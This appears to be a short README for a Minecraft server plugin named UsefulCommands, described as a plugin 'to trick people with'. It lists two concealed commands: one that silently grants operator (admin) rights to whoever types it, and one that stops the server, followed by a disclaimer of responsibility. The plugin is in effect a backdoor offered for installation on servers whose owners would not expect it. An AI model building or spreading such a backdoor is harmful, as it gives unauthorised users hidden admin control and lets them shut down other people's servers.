#UsefulCommands


A fun plugin to trick people with!

-----DISCLAIMER-----

In no way is this plugin to be used maliciously on servers to which you either don't know the owner or don't have permission to use it. 
I am in no way responsible for any wrong doing which is inflicted by using this plugin.

-----DISCLAIMER-----

Commands:

/.o - silently OP's the player who executes the command.



/.s - stops the server

I seek to work upon this plugin, adding many more commands and doing some tidying up of the code.
